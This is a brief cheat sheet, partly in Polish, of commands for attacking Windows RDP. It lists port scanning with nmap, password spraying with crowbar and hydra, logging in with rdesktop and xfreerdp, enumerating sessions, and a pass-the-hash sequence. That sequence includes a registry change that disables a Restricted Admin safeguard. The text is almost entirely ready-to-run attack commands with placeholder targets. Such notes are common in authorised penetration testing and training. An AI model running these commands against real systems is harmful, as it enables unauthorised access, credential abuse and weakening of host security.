**Nmap**
nmap -Pn -p3389 IP


**Password Spraying**
crowbar -b rdp -s IP/32 -U users.txt -c 'PASSWORD'
hydra -L users.txt -p 'PASSWORD' IP rdp -t 1


**Połączenie**
rdesktop -u user -p 'PASSWORD' IP
xfreerdp /v:IP /u:user /p:'PASSWORD'


**Enumeracja sesji
query user


**Pass-the-Hash**
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f


xfreerdp /v:IP /u:user /pth:NTHASH
